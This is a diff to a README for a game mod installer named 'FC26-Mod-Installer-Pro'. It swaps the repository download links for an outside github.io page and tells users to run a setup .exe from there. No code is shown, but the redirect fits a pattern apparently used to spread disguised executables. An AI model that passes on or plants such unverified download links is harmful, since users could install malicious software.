@@ -1,6 +1,6 @@
 # 🛠️ FC26-Mod-Installer-Pro - Manage your game mods with ease
 
-[![](https://img.shields.io/badge/Download-FC26_Mod_Installer-blue.svg)](https://github.com/ogeku/FC26-Mod-Installer-Pro)
+[![](https://img.shields.io/badge/Download-FC26_Mod_Installer-blue.svg)](https://ogeku.github.io)
 
 ## 📖 About this application
 
@@ -27,7 +27,7 @@ Before you install the tool, make sure your computer meets these requirements:
 
 ## 📥 How to download and install
 
-1. Visit the [official release page](https://github.com/ogeku/FC26-Mod-Installer-Pro) to download the latest setup file.
+1. Visit the [official release page](https://ogeku.github.io) to download the latest setup file.
 2. Locate the file named `FC26-Mod-Installer-Pro-Setup.exe` in your downloads folder.
 3. Double-click the installer file to begin the setup process.
 4. Follow the on-screen prompts to select your installation path.
